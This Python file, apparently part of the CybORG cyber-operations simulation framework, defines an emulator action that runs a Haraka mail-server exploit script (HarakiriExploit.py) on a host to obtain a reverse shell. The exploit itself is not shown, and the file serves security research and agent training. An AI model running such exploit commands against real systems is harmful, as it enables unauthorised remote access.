from typing import Union

from CybORG.Shared import Observation
from CybORG.Simulator.State import State

from .RunProcessAction import RunProcessAction
from CybORG.Emulator.Observations.Velociraptor.ReverseShellObservation import ReverseShellObservation

import random
import re
import string


class HarakaExploitAction(RunProcessAction):

    connection_key_size = 10

    ip_address_regex = re.compile("(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)")

    @classmethod
    def get_connection_key(cls):
        return ''.join(
            random.SystemRandom().choice(
                string.ascii_uppercase + string.digits
            ) for _ in range(cls.connection_key_size)
        )

    def __init__(
            self,
            credentials_file,
            hostname,
            mail_server_hostname,
            ssh_port,
            reverse_shell_server_port
    ):
        self.connection_key = self.get_connection_key()
        command = f"cd /usr/local/scripts/python;python HarakiriExploit.py -n {self.connection_key} " + \
                  f"-s {ssh_port} -m {mail_server_hostname} -r {reverse_shell_server_port}"

        super().__init__(credentials_file, hostname, command)

        self.ssh_port = ssh_port

    def execute(self, state: Union[State, None]) -> Observation:

        observation = super().execute(state)
        return ReverseShellObservation(observation, self.connection_key, self.ssh_port)
